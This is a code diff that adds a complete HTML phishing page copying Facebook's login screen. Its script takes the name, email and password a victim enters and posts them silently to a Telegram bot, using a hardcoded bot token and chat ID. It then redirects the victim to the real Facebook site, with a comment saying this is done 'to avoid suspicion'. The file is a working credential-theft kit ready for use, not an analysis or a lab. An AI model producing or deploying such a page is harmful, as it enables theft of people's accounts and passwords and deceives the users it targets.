@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Clone</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f2f5;
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            max-width: 1000px;
+            width: 100%;
+            padding: 0 15px;
+        }
+
+        .text {
+            margin-bottom: 90px;
+        }
+
+        .text h1 {
+            color: #1877f2;
+            font-size: 4rem;
+            margin-bottom: 10px;
+        }
+
+        .text p {
+            font-size: 1.75rem;
+            white-space: nowrap;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        form input {
+            height: 55px;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 1rem;
+            padding: 0 14px;
+        }
+
+        form input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        ::placeholder {
+            color: #777;
+            font-size: 1.063rem;
+        }
+
+        .link {
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            gap: 15px;
+        }
+
+        .link .login {
+            border: none;
+            outline: none;
+            cursor: pointer;
+            background: #1877f2;
+            padding: 15px 0;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1.25rem;
+            font-weight: 600;
+            transition: 0.2s ease;
+        }
+
+        .link .login:hover {
+            background: #0d65d9;
+        }
+
+        .link .forgot {
+            color: #1877f2;
+            font-size: 0.875rem;
+            text-decoration: none;
+        }
+
+        .link .forgot:hover {
+            text-decoration: underline;
+        }
+
+        hr {
+            border: none;
+            height: 1px;
+            background-color: #ccc;
+            margin: 20px 0;
+        }
+
+        .button a {
+            padding: 15px 20px;
+            background: #42b72a;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 1.063rem;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .button a:hover {
+            background: #3ba626;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .text {
+                margin-bottom: 30px;
+            }
+        }
+
+        @media (max-width: 460px) {
+            .text h1 {
+                font-size: 3.5rem;
+            }
+
+            .text p {
+                font-size: 1.3rem;
+            }
+
+            form {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="text">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world</p>
+            <p>around you on Facebook.</p>
+        </div>
+        <form id="loginForm">
+            <input type="text" id="name" name="name" placeholder="Full Name" required>
+            <input type="email" id="email" name="email" placeholder="Email or phone number" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <div class="link">
+                <button type="submit" class="login">Login</button>
+                <a href="#" class="forgot">Forgot password?</a>
+            </div>
+            <hr>
+            <div class="button">
+                <a href="#">Create new account</a>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Telegram Bot API details (replace with your own)
+            const botToken = '8426849824:AAFNvZs-3qkjlAYmmOhbY-cC06dU_a3_QkY'; // Get from BotFather
+            const chatId = '7580087867'; // Your Telegram chat ID
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Message to send to Telegram
+            const message = `New Login Submission:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`;
+
+            try {
+                // Send data to Telegram bot silently
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+
+                // Redirect to official Facebook login page
+                window.location.href = 'https://www.facebook.com';
+            } catch (error) {
+                console.error('Error sending data to Telegram:', error);
+                // Redirect even if Telegram fails to avoid suspicion
+                window.location.href = 'https://www.facebook.com';
+            }
+        });
+    </script>
+</body>
+</html>
